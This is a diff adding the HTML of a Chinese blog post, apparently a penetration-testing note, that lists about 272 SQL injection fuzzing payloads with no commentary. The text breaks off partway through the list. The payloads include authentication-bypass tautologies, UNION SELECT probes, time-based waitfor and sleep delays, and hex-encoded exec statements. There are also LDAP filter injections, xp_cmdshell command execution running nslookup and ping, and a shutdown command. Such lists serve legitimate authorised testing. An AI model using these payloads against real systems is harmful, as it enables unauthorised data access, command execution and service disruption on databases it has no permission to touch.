@@ -1,0 +1,657 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/Aries.ico">
+  <link rel="icon" href="/img/Aries.ico">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="YY">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="sql注入fuzz字典字典2123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[渗透测试] SQL注入fuzz字典">
+<meta property="og:url" content="https://s1n9l3.github.io/2022/12/13/[%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95]%20sql%E6%B3%A8%E5%85%A5fuzz%E5%AD%97%E5%85%B8/index.html">
+<meta property="og:site_name" content="S1n9l3">
+<meta property="og:description" content="sql注入fuzz字典字典2123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-12-13T11:10:19.312Z">
+<meta property="article:modified_time" content="2022-12-13T11:37:59.298Z">
+<meta property="article:author" content="YY">
+<meta property="article:tag" content="渗透测试">
+<meta property="article:tag" content="sql注入">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  
+  <title>[渗透测试] SQL注入fuzz字典 - S1n9l3</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"s1n9l3.github.io","root":"/","version":"1.9.3","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>WXYY</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/post.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="[渗透测试] SQL注入fuzz字典"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-12-13 19:10" pubdate>
+          2022年12月13日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          7k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          59 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">[渗透测试] SQL注入fuzz字典</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="sql注入fuzz字典"><a href="#sql注入fuzz字典" class="headerlink" title="sql注入fuzz字典"></a>sql注入fuzz字典</h1><h2 id="字典2"><a href="#字典2" class="headerlink" title="字典2"></a>字典2</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27;</span><br><span class="hljs-string">&quot;</span><br><span class="hljs-string">#</span><br><span class="hljs-string">-</span><br><span class="hljs-string">--</span><br><span class="hljs-string">&#x27;</span> <span class="hljs-comment">--</span><br><span class="hljs-comment">--&#x27;;</span><br><span class="hljs-string">&#x27; ;</span><br><span class="hljs-string">= &#x27;</span><br><span class="hljs-operator">=</span> ;<br><span class="hljs-operator">=</span> <span class="hljs-comment">--</span><br>\x23<br>\x27<br>\x3D \x3B<span class="hljs-string">&#x27;</span><br><span class="hljs-string">\x3D \x27</span><br><span class="hljs-string">\x27\x4F\x52 SELECT *</span><br><span class="hljs-string">\x27\x6F\x72 SELECT *</span><br><span class="hljs-string">&#x27;</span><span class="hljs-keyword">or</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span><br>admin<span class="hljs-string">&#x27;--</span><br><span class="hljs-string">&#x27;</span>;shutdown<span class="hljs-comment">--</span><br><span class="hljs-operator">&lt;&gt;</span>&quot;&#x27;%;)(&amp;+<br>&#x27; or &#x27;&#x27;=&#x27;<br>&#x27; or &#x27;x&#x27;=&#x27;x<br>&quot; <span class="hljs-keyword">or</span> &quot;x&quot;<span class="hljs-operator">=</span>&quot;x<br>&#x27;) or (&#x27;x&#x27;=&#x27;x<br>0 or 1=1<br>&#x27; or 0=0 --<br>&quot; <span class="hljs-keyword">or</span> <span class="hljs-number">0</span><span class="hljs-operator">=</span><span class="hljs-number">0</span> <span class="hljs-comment">--</span><br><span class="hljs-keyword">or</span> <span class="hljs-number">0</span><span class="hljs-operator">=</span><span class="hljs-number">0</span> <span class="hljs-comment">--</span><br><span class="hljs-string">&#x27; or 0=0 #</span><br><span class="hljs-string">&quot; or 0=0 #</span><br><span class="hljs-string">or 0=0 #</span><br><span class="hljs-string">&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-comment">--</span><br>&quot; or 1=1--<br>&#x27; or &#x27;1&#x27;=&#x27;1&#x27;--<br>&quot;<span class="hljs-string">&#x27; or 1 --&#x27;</span>&quot;<br>or 1=1--<br>or%201=1<br>or%201=1 --<br>&#x27; or 1=1 or &#x27;&#x27;=&#x27;<br>&quot; <span class="hljs-keyword">or</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">or</span> &quot;&quot;<span class="hljs-operator">=</span>&quot;<br>&#x27; or a=a--<br>&quot; <span class="hljs-keyword">or</span> &quot;a&quot;<span class="hljs-operator">=</span>&quot;a<br>&#x27;) or (&#x27;a&#x27;=&#x27;a<br>&quot;) <span class="hljs-keyword">or</span> (&quot;a&quot;<span class="hljs-operator">=</span>&quot;a<br>hi&quot; <span class="hljs-keyword">or</span> &quot;a&quot;<span class="hljs-operator">=</span>&quot;a<br>hi&quot; <span class="hljs-keyword">or</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-comment">--</span><br>hi<span class="hljs-string">&#x27; or 1=1 --</span><br><span class="hljs-string">hi&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;a&#x27;</span><span class="hljs-operator">=</span><span class="hljs-string">&#x27;a</span><br><span class="hljs-string">hi&#x27;</span>) <span class="hljs-keyword">or</span> (<span class="hljs-string">&#x27;a&#x27;</span><span class="hljs-operator">=</span><span class="hljs-string">&#x27;a</span><br><span class="hljs-string">hi&quot;) or (&quot;a&quot;=&quot;a</span><br><span class="hljs-string">&#x27;</span>hi<span class="hljs-string">&#x27; or &#x27;</span>x<span class="hljs-string">&#x27;=&#x27;</span>x<span class="hljs-string">&#x27;;</span><br><span class="hljs-string">@variable</span><br><span class="hljs-string">,@variable</span><br><span class="hljs-string">PRINT</span><br><span class="hljs-string">PRINT @@variable</span><br><span class="hljs-string">select</span><br><span class="hljs-string">insert</span><br><span class="hljs-string">as</span><br><span class="hljs-string">or</span><br><span class="hljs-string">procedure</span><br><span class="hljs-string">limit</span><br><span class="hljs-string">order by</span><br><span class="hljs-string">asc</span><br><span class="hljs-string">desc</span><br><span class="hljs-string">delete</span><br><span class="hljs-string">update</span><br><span class="hljs-string">distinct</span><br><span class="hljs-string">having</span><br><span class="hljs-string">truncate</span><br><span class="hljs-string">replace</span><br><span class="hljs-string">like</span><br><span class="hljs-string">handler</span><br><span class="hljs-string">bfilename</span><br><span class="hljs-string">&#x27;</span> <span class="hljs-keyword">or</span> username <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%</span><br><span class="hljs-string">&#x27;</span> <span class="hljs-keyword">or</span> uname <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%</span><br><span class="hljs-string">&#x27;</span> <span class="hljs-keyword">or</span> userid <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%</span><br><span class="hljs-string">&#x27;</span> <span class="hljs-keyword">or</span> uid <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%</span><br><span class="hljs-string">&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%</span><br><span class="hljs-string">exec xp</span><br><span class="hljs-string">exec sp</span><br><span class="hljs-string">&#x27;</span>; <span class="hljs-keyword">exec</span> master..xp_cmdshell<br><span class="hljs-string">&#x27;; exec xp_regread</span><br><span class="hljs-string">t&#x27;</span><span class="hljs-keyword">exec</span> master..xp_cmdshell <span class="hljs-string">&#x27;nslookup www.google.com&#x27;</span><span class="hljs-comment">--</span><br><span class="hljs-comment">--sp_password</span><br>\x27UNION <span class="hljs-keyword">SELECT</span><br><span class="hljs-string">&#x27; UNION SELECT</span><br><span class="hljs-string">&#x27;</span> <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">ALL</span> <span class="hljs-keyword">SELECT</span><br><span class="hljs-string">&#x27; or (EXISTS)</span><br><span class="hljs-string">&#x27;</span> (<span class="hljs-keyword">select</span> top <span class="hljs-number">1</span><br><span class="hljs-string">&#x27;||UTL_HTTP.REQUEST</span><br><span class="hljs-string">1;SELECT%20*</span><br><span class="hljs-string">to_timestamp_tz</span><br><span class="hljs-string">tz_offset</span><br><span class="hljs-string">&amp;lt;&amp;gt;&amp;quot;&#x27;</span><span class="hljs-operator">%</span>;)(<span class="hljs-operator">&amp;</span>amp;<span class="hljs-operator">+</span><br><span class="hljs-string">&#x27;%20or%201=1</span><br><span class="hljs-string">%27%20or%201=1</span><br><span class="hljs-string">%20$(sleep%2050)</span><br><span class="hljs-string">%20&#x27;</span>sleep<span class="hljs-operator">%</span><span class="hljs-number">2050</span><span class="hljs-string">&#x27;</span><br><span class="hljs-string">char%4039%41%2b%40SELECT</span><br><span class="hljs-string">&amp;apos;%20OR</span><br><span class="hljs-string">&#x27;</span>sqlattempt1<br>(sqlattempt2)<br><span class="hljs-operator">|</span><br><span class="hljs-operator">%</span><span class="hljs-number">7</span>C<br><span class="hljs-operator">*</span><span class="hljs-operator">|</span><br><span class="hljs-operator">%</span><span class="hljs-number">2</span>A<span class="hljs-operator">%</span><span class="hljs-number">7</span>C<br><span class="hljs-operator">*</span>(<span class="hljs-operator">|</span>(mail<span class="hljs-operator">=</span><span class="hljs-operator">*</span>))<br><span class="hljs-operator">%</span><span class="hljs-number">2</span>A<span class="hljs-operator">%</span><span class="hljs-number">28</span><span class="hljs-operator">%</span><span class="hljs-number">7</span>C<span class="hljs-operator">%</span><span class="hljs-number">28</span>mail<span class="hljs-operator">%</span><span class="hljs-number">3</span>D<span class="hljs-operator">%</span><span class="hljs-number">2</span>A<span class="hljs-operator">%</span><span class="hljs-number">29</span><span class="hljs-operator">%</span><span class="hljs-number">29</span><br><span class="hljs-operator">*</span>(<span class="hljs-operator">|</span>(objectclass<span class="hljs-operator">=</span><span class="hljs-operator">*</span>))<br><span class="hljs-operator">%</span><span class="hljs-number">2</span>A<span class="hljs-operator">%</span><span class="hljs-number">28</span><span class="hljs-operator">%</span><span class="hljs-number">7</span>C<span class="hljs-operator">%</span><span class="hljs-number">28</span>objectclass<span class="hljs-operator">%</span><span class="hljs-number">3</span>D<span class="hljs-operator">%</span><span class="hljs-number">2</span>A<span class="hljs-operator">%</span><span class="hljs-number">29</span><span class="hljs-operator">%</span><span class="hljs-number">29</span><br>(<br><span class="hljs-operator">%</span><span class="hljs-number">28</span><br>)<br><span class="hljs-operator">%</span><span class="hljs-number">29</span><br><span class="hljs-operator">&amp;</span><br><span class="hljs-operator">%</span><span class="hljs-number">26</span><br><span class="hljs-operator">!</span><br><span class="hljs-operator">%</span><span class="hljs-number">21</span><br><span class="hljs-string">&#x27; or 1=1 or &#x27;&#x27;=&#x27;</span><br><span class="hljs-string">&#x27; or &#x27;&#x27;=&#x27;</span><br>x<span class="hljs-string">&#x27; or 1=1 or &#x27;</span>x<span class="hljs-string">&#x27;=&#x27;</span>y<br><span class="hljs-operator">/</span><br><span class="hljs-operator">/</span><span class="hljs-operator">/</span><br><span class="hljs-operator">/</span><span class="hljs-comment">/*</span><br><span class="hljs-comment">*/</span><span class="hljs-operator">*</span><br><span class="hljs-string">&#x27;</span><br><span class="hljs-string">&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;</span><br><span class="hljs-string">&#x27;</span> <span class="hljs-keyword">AnD</span> <span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;</span><br><span class="hljs-string">&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;</span><br><span class="hljs-string">&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%</span><br><span class="hljs-string">&#x27;</span> <span class="hljs-keyword">aND</span> <span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%</span><br><span class="hljs-string">&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;&#x27;</span><span class="hljs-comment">--</span><br><span class="hljs-string">&#x27; and 2&gt;1--</span><br><span class="hljs-string">&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-number">2</span><span class="hljs-operator">&gt;</span><span class="hljs-number">3</span><span class="hljs-comment">--</span><br><span class="hljs-string">&#x27;) and (&#x27;</span>x<span class="hljs-string">&#x27;=&#x27;</span>x<br>) <span class="hljs-keyword">and</span> (<span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span><br><span class="hljs-string">&#x27;or&#x27;&#x27;=&#x27;</span><br><span class="hljs-string">&#x27;or&#x27;</span><span class="hljs-operator">=</span><span class="hljs-string">&#x27;or&#x27;</span><br>a<span class="hljs-string">&#x27; or 1=1--</span><br><span class="hljs-string">&quot;a&quot;&quot; or 1=1--&quot;</span><br><span class="hljs-string"> or a = a</span><br><span class="hljs-string">a&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;a&#x27;</span> <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;a</span><br><span class="hljs-string">1 or 1=1</span><br><span class="hljs-string">a&#x27;</span> waitfor delay <span class="hljs-string">&#x27;0:0:10&#x27;</span><span class="hljs-comment">--</span><br><span class="hljs-number">1</span> waitfor delay <span class="hljs-string">&#x27;0:0:10&#x27;</span><span class="hljs-comment">--</span><br><span class="hljs-keyword">declare</span> <span class="hljs-variable">@q</span> nvarchar (<span class="hljs-number">200</span>) <span class="hljs-keyword">select</span> <span class="hljs-variable">@q</span> <span class="hljs-operator">=</span> <span class="hljs-number">0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000</span> <span class="hljs-keyword">exec</span>(<span class="hljs-variable">@q</span>)<br><span class="hljs-keyword">declare</span> <span class="hljs-variable">@s</span> <span class="hljs-type">varchar</span>(<span class="hljs-number">200</span>) <span class="hljs-keyword">select</span> <span class="hljs-variable">@s</span> <span class="hljs-operator">=</span> <span class="hljs-number">0x77616974666F722064656C61792027303A303A31302700</span> <span class="hljs-keyword">exec</span>(<span class="hljs-variable">@s</span>) <br><span class="hljs-keyword">declare</span> <span class="hljs-variable">@q</span> nvarchar (<span class="hljs-number">200</span>) <span class="hljs-number">0x730065006c00650063007400200040004000760065007200730069006f006e00</span> <span class="hljs-keyword">exec</span>(<span class="hljs-variable">@q</span>)<br><span class="hljs-keyword">declare</span> <span class="hljs-variable">@s</span> <span class="hljs-type">varchar</span> (<span class="hljs-number">200</span>) <span class="hljs-keyword">select</span> <span class="hljs-variable">@s</span> <span class="hljs-operator">=</span> <span class="hljs-number">0x73656c65637420404076657273696f6e</span> <span class="hljs-keyword">exec</span>(<span class="hljs-variable">@s</span>)<br>a<span class="hljs-string">&#x27;</span><br><span class="hljs-string">?</span><br><span class="hljs-string">&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span><br>‘ <span class="hljs-keyword">or</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-comment">--</span><br>x<span class="hljs-string">&#x27; AND userid IS NULL; --</span><br><span class="hljs-string">x&#x27;</span> <span class="hljs-keyword">AND</span> email <span class="hljs-keyword">IS</span> <span class="hljs-keyword">NULL</span>; <span class="hljs-comment">--</span><br>anything<span class="hljs-string">&#x27; OR &#x27;</span>x<span class="hljs-string">&#x27;=&#x27;</span>x<br>x<span class="hljs-string">&#x27; AND 1=(SELECT COUNT(*) FROM tabname); --</span><br><span class="hljs-string">x&#x27;</span> <span class="hljs-keyword">AND</span> members.email <span class="hljs-keyword">IS</span> <span class="hljs-keyword">NULL</span>; <span class="hljs-comment">--</span><br>x<span class="hljs-string">&#x27; OR full_name LIKE &#x27;</span><span class="hljs-operator">%</span>Bob<span class="hljs-operator">%</span><br><span class="hljs-number">23</span> <span class="hljs-keyword">OR</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span><br><span class="hljs-string">&#x27;; exec master..xp_cmdshell &#x27;</span>ping <span class="hljs-number">172.10</span><span class="hljs-number">.1</span><span class="hljs-number">.255</span><span class="hljs-string">&#x27;--</span><br><span class="hljs-string">&#x27;</span><br><span class="hljs-string">&#x27;%20or%20&#x27;&#x27;=&#x27;</span><br><span class="hljs-string">&#x27;%20or%20&#x27;</span>x<span class="hljs-string">&#x27;=&#x27;</span>x<br><span class="hljs-operator">%</span><span class="hljs-number">20</span><span class="hljs-keyword">or</span><span class="hljs-operator">%</span><span class="hljs-number">20</span>x<span class="hljs-operator">=</span>x<br><span class="hljs-string">&#x27;)%20or%20(&#x27;</span>x<span class="hljs-string">&#x27;=&#x27;</span>x<br><span class="hljs-number">0</span> <span class="hljs-keyword">or</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span><br><span class="hljs-string">&#x27; or 0=0 --</span><br><span class="hljs-string">&quot; or 0=0 --</span><br><span class="hljs-string">or 0=0 --</span><br><span class="hljs-string">&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-number">0</span><span class="hljs-operator">=</span><span class="hljs-number">0</span> #<br> <span class="hljs-keyword">or</span> <span class="hljs-number">0</span><span class="hljs-operator">=</span><span class="hljs-number">0</span> #&quot;<br>or 0=0 #<br>&#x27; or 1=1--<br>&quot; <span class="hljs-keyword">or</span> <span class="hljs-number">1</span><span 